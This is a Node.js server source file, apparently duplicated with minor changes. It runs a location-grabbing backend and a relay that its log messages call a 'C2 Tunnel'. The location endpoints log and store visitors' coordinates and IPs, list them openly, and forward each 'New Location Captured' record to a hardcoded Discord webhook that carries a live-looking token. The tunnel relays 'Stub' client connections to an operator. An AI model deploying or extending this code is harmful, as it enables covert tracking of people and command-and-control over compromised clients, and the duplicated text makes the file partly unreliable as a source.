const express = require('express');
const http = require('http');
const WebSocket = require('ws');
const crypto = require('crypto');
const path = require('path');

const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ noServer: true });

const port = process.env.PORT || 10000;

let tunnelWs = null;
const activeConnections = new Map();

function generateId() {
  return crypto.randomBytes(8).toString('hex');
}

// ========== MIDDLEWARE ==========
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// ========== ROOT ROUTE - Serve the HTML page ==========
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

// ========== LOCATION API ENDPOINTS ==========
app.post('/api/location', (req, res) => {
  const locationData = req.body;
  const timestamp = new Date().toISOString();
  
  console.log('='.repeat(50));
  console.log(`[LOCATION] ${timestamp}`);
  console.log(`  IP: ${req.ip || 'unknown'}`);
  console.log(`  Latitude: ${locationData.latitude}`);
  console.log(`  Longitude: ${locationData.longitude}`);
  console.log(`  Accuracy: ${locationData.accuracy} meters`);
  console.log(`  User Agent: ${locationData.userAgent || 'unknown'}`);
  console.log('='.repeat(50));
  
  // Store in memory
  if (!global.locations) {
    global.locations = [];
  }
  global.locations.push({
    timestamp,
    ip: req.ip,
    ...locationData
  });
  
  res.json({ status: 'ok', message: 'Location received', id: global.locations.length });
});

app.post('/api/location/discord', (req, res) => {
  const locationData = req.body;
  const discordWebhook = 'https://discord.com/api/webhooks/1481421187211858021/ouKVnU8Zage6vToMZQ4aqRHKMp2ZsuYgGqit9i3Wqwr2L4H1bzsOVy6xrtXFl0fS7Eaw';
  
  const message = {
    content: `**New Location Captured**\nLatitude: ${locationData.latitude}\nLongitude: ${locationData.longitude}\nAccuracy: ${locationData.accuracy}m\nTime: ${locationData.timestamp}`
  };
  
  // Send to Discord
  fetch(discordWebhook, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(message)
  }).catch(e => console.log('Discord webhook error:', e));
  
  res.json({ status: 'ok' });
});

app.get('/api/locations', (req, res) => {
  res.json({
    total: global.locations?.length || 0,
    locations: global.locations || []
  });
});

// ========== PING ENDPOINT ==========
app.get('/ping', (req, res) => {
  res.send('ok');
});

// ========== STATIC FILES FALLBACK ==========
app.use(express.static(__dirname));

// ========== WEBSOCKET TUNNEL ==========
wss.on('connection', (ws, req) => {
  if (req.url.startsWith('/_tunnel')) {
    if (tunnelWs) {
      console.log('Replacing existing tunnel connection.');
      tunnelWs.close();
    }
    tunnelWs = ws;
    console.log('C2 Tunnel connected successfully.');

    ws.on('message', (message) => {
      try {
        const payload = JSON.parse(message.toString());
        if (payload.type === 'ws_message') {
            const clientWs = activeConnections.get(payload.req_id);
            if (clientWs && clientWs.readyState === WebSocket.OPEN) {
                clientWs.send(payload.data);
            }
        } else if (payload.type === 'ws_close') {
            const clientWs = activeConnections.get(payload.req_id);
            if (clientWs) {
                clientWs.close();
                activeConnections.delete(payload.req_id);
            }
        }
      } catch (err) {
        console.error('Tunnel message error:', err);
      }
    });

    ws.on('close', () => {
      console.log('C2 Tunnel disconnected.');
      tunnelWs = null;
      for (const [id, clientWs] of activeConnections.entries()) {
        clientWs.close();
      }
      activeConnections.clear();
    });
    return;
  }

  // Handle Stub WebSocket connections
  if (!tunnelWs || tunnelWs.readyState !== WebSocket.OPEN) {
    ws.close(1011, 'Tunnel not connected');
    return;
  }

  const reqId = generateId();
  activeConnections.set(reqId, ws);

  tunnelWs.send(JSON.stringify({
    type: 'ws_connect',
    req_id: reqId,
    url: req.url,
    headers: req.headers
  }));

  ws.on('message', (message) => {
    if (tunnelWs && tunnelWs.readyState === WebSocket.OPEN) {
      tunnelWs.send(JSON.stringify({
        type: 'ws_message',
        req_id: reqId,
        data: message.toString()
      }));
    }
  });

  ws.on('close', () => {
    activeConnections.delete(reqId);
    if (tunnelWs && tunnelWs.readyState === WebSocket.OPEN) {
      tunnelWs.send(JSON.stringify({
        type: 'ws_close',
        req_id: reqId
      }));
    }
  });
});

server.on('upgrade', (request, socket, head) => {
  wss.handleUpgrade(request, socket, head, (ws) => {
    wss.emit('connection', ws, request);
  });
});

server.listen(port, () => {
  console.log(`Render Tunnel Proxy listening on port ${port}`);
  console.log(`Location API ready at /api/location`);
  console.log(`View locations at /api/locations`);
  console.log(`Website available at https://proxy-nhno.onrender.com/`);
});const express = require('express');
const http = require('http');
const WebSocket = require('ws');
const crypto = require('crypto');
const path = require('path');

const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ noServer: true });

const port = process.env.PORT || 10000;

let tunnelWs = null;
const activeConnections = new Map();

function generateId() {
  return crypto.randomBytes(8).toString('hex');
}

// ========== MIDDLEWARE ==========
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(__dirname));

// ========== LOCATION API ENDPOINTS ==========
app.post('/api/location', (req, res) => {
  const locationData = req.body;
  const timestamp = new Date().toISOString();
  
  console.log('='.repeat(50));
  console.log(`[LOCATION] ${timestamp}`);
  console.log(`  IP: ${req.ip || 'unknown'}`);
  console.log(`  Latitude: ${locationData.latitude}`);
  console.log(`  Longitude: ${locationData.longitude}`);
  console.log(`  Accuracy: ${locationData.accuracy} meters`);
  console.log(`  User Agent: ${locationData.userAgent || 'unknown'}`);
  console.log('='.repeat(50));
  
  // Store in memory (optional)
  if (!global.locations) {
    global.locations = [];
  }
  global.locations.push({
    timestamp,
    ip: req.ip,
    ...locationData
  });
  
  res.json({ status: 'ok', message: 'Location received', id: global.locations.length });
});

app.post('/api/location/discord', (req, res) => {
  const locationData = req.body;
  const discordWebhook = 'https://discord.com/api/webhooks/1481421187211858021/ouKVnU8Zage6vToMZQ4aqRHKMp2ZsuYgGqit9i3Wqwr2L4H1bzsOVy6xrtXFl0fS7Eaw';
  
  const message = {
    content: `**New Location Captured**\nLatitude: ${locationData.latitude}\nLongitude: ${locationData.longitude}\nAccuracy: ${locationData.accuracy}m\nTime: ${locationData.timestamp}`
  };
  
  // Send to Discord (don't wait for response)
  fetch(discordWebhook, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(message)
  }).catch(e => console.log('Discord webhook error:', e));
  
  res.json({ status: 'ok' });
});

app.get('/api/locations', (req, res) => {
  res.json({
    total: global.locations?.length || 0,
    locations: global.locations || []
  });
});

// ========== EXISTING ENDPOINTS ==========
app.get('/ping', (req, res) => {
  res.send('ok');
});

// ========== WEBSOCKET TUNNEL ==========
wss.on('connection', (ws, req) => {
  if (req.url.startsWith('/_tunnel')) {
    if (tunnelWs) {
      console.log('Replacing existing tunnel connection.');
      tunnelWs.close();
    }
    tunnelWs = ws;
    console.log('C2 Tunnel connected successfully.');

    ws.on('message', (message) => {
      try {
        const payload = JSON.parse(message.toString());
        if (payload.type === 'ws_message') {
            const clientWs = activeConnections.get(payload.req_id);
            if (clientWs && clientWs.readyState === WebSocket.OPEN) {
                clientWs.send(payload.data);
            }
        } else if (payload.type === 'ws_close') {
            const clientWs = activeConnections.get(payload.req_id);
            if (clientWs) {
                clientWs.close();
                activeConnections.delete(payload.req_id);
            }
        }
      } catch (err) {
        console.error('Tunnel message error:', err);
      }
    });

    ws.on('close', () => {
      console.log('C2 Tunnel disconnected.');
      tunnelWs = null;
      for (const [id, clientWs] of activeConnections.entries()) {
        clientWs.close();
      }
      activeConnections.clear();
    });
    return;
  }

  // Handle Stub WebSocket connections
  if (!tunnelWs || tunnelWs.readyState !== WebSocket.OPEN) {
    ws.close(1011, 'Tunnel not connected');
    return;
  }

  const reqId = generateId();
  activeConnections.set(reqId, ws);

  tunnelWs.send(JSON.stringify({
    type: 'ws_connect',
    req_id: reqId,
    url: req.url,
    headers: req.headers
  }));

  ws.on('message', (message) => {
    if (tunnelWs && tunnelWs.readyState === WebSocket.OPEN) {
      tunnelWs.send(JSON.stringify({
        type: 'ws_message',
        req_id: reqId,
        data: message.toString()
      }));
    }
  });

  ws.on('close', () => {
    activeConnections.delete(reqId);
    if (tunnelWs && tunnelWs.readyState === WebSocket.OPEN) {
      tunnelWs.send(JSON.stringify({
        type: 'ws_close',
        req_id: reqId
      }));
    }
  });
});

server.on('upgrade', (request, socket, head) => {
  wss.handleUpgrade(request, socket, head, (ws) => {
    wss.emit('connection', ws, request);
  });
});

server.listen(port, () => {
  console.log(`Render Tunnel Proxy listening on port ${port}`);
  console.log(`Location API ready at /api/location`);
  console.log(`View locations at /api/locations`);
});
